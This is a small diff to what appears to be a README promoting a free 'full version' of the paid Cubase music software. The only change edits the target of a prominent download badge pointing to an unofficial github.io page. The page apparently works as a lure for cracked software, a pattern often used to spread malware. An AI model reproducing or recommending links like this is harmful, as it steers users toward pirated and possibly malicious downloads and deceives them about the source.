@@ -2,7 +2,7 @@
 
 Unlock the full power of Cubase for professional music production, mixing, and mastering. Perfect for producers, composers, and sound engineers seeking industry-standard tools.
 
-[![DOWNLOAD NOW](https://img.shields.io/badge/Download-Cubase_Full_Version-brightgreen?style=for-the-badge&logo=steam)](https://cubase-full.github.io/.github/)
+[![DOWNLOAD NOW](https://img.shields.io/badge/Download-Cubase_Full_Version-brightgreen?style=for-the-badge&logo=steam)](https://cubase-full.github.io/.github/cubase)
 
 ---
 
